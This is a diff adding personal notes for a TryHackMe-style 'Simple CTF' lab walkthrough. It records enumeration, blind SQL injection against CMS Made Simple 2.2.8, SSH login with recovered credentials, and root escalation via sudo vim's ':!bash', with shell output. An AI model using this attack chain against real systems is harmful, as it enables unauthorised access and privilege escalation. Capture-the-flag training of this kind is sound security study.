@@ -281,10 +281,109 @@ Progress: 207643 / 207644 (100.00%)
 Finished
 ===============================================================
 ```
+> [!NOTE]
+> Looking individually /module revealed nothing interesting even with loads of folders
+![[simplemodules.png]]
+>
+> /uploads, /doc lead to nowhere, /admin led to admin login page which I dont have creds for and /assets led to somewhere but nowhere also:
+![[simpleassets.png]]
+> 
+> /lib led nowhere and /tmp led somewhere but nowhere too.
+> 
+![[simpletmp.png]]
 
-> [!NOTE] Title
-> Contents
+> [!info]
+> Looking online at CMS made simple for a username being admin but password can be cracked?
+> Upon further investigation of the THM tasks and its linear style - I realised I need to explore further into the CVE and how to perform the SQLi - An issue was discovered in CMS Made Simple 2.2.8. It is possible with the News module, through a crafted URL, to achieve unauthenticated blind time-based SQL injection via the m1_idlist parameter.
 
+> [!note]
+> OK found a useful github link which I feel is cheating but I did just google the CVE and this is what came up https://github.com/Dh4nuJ4/SimpleCTF-UpdatedExploit
+![[Github python3 method.png]]
+
+> [!info]
+> Realised hashed password didnt come through due to incorrect option insert of -c and had to manually download the wordlist for some reason it didnt exist where its supposed to be?
+> ![[github exploit for hashed pwd.png]]
+
+> [!important]
+> Target IP = 10.66.154.113
+
+> [!question]
+> Where can you login with the details obtained?
+
+> [!info]
+> I just kept putting in random logins that I know like telnet, admin login, login page etc. but realised THM want a 3 letter word and with username & PW, it must be SSH.
+
+> [!note]
+> After quick brain fart of not knowing that port 22 is closed and port 2222 is open, I SSH'd via the following cmd:
+> ```
+> ssh mitch@10.66.154.113
+> ```
+> with password secret worked
+![[SSH login as Mitch.png]]
+
+> [!question]
+> What's the user flag?
+
+> [!note]
+> simply using cat cmd i found the file which had the flag:
+![[user flag.png]]
+
+> [!question]
+> Is there any other user in the home directory? What's its name?
+
+> [!note]
+> simply backing out into the home folder allows me to see another user called sunbath:
+> ![[home folder users.png]]
+
+> [!question]
+> What can you leverage to spawn a privileged shell?
+
+> [!note]
+> wasn't sure about the question above but i tried to cd into sunbath but wasn't able to do so then was curious as mitch, what can I run as sudo and found the answer to be VIM:
+>```
+>> $ ls
+mitch  sunbath
+$ cd sun	
+-sh: 17: cd: can't cd to sun
+$ cd sunbath
+-sh: 18: cd: can't cd to sunbath
+$ ls -a
+.  ..  mitch  sunbath
+$ ls -la
+total 16
+drwxr-xr-x  4 root    root    4096 aug 17  2019 .
+drwxr-xr-x 23 root    root    4096 aug 19  2019 ..
+drwxr-x---  3 mitch   mitch   4096 feb  5 09:27 mitch
+drwxr-x--- 16 sunbath sunbath 4096 aug 19  2019 sunbath
+$ sudo -l
+User mitch may run the following commands on Machine:
+(root) NOPASSWD: /usr/bin/vim
+>```
+
+> [!question]
+> What's the root flag?
+
+> [!note]
+> Looking online I found that being able to run VIM as SUDO allows such an easy way to gain root shell via simple cmd :!bash and this led to root shell access and I found root shell:
+> ```
+> root@Machine:/home/sunbath# clear
+root@Machine:/home/sunbath# cd ..
+root@Machine:/home# ls
+mitch  sunbath
+root@Machine:/home# cd ..
+root@Machine:/# ls
+bin    dev   initrd.img      lost+found  opt   run   srv  usr      vmlinuz.old
+boot   etc   initrd.img.old  media       proc  sbin  sys  var
+cdrom  home  lib             mnt         root  snap  tmp  vmlinuz
+root@Machine:/# cd root
+root@Machine:/root# ls
+root.txt
+root@Machine:/root# cat root.txt
+W3ll d0n3. You made it!
+root@Machine:/root# > 
+> ```
+
+![[Simple CTF DONE.png]]
 
 
 
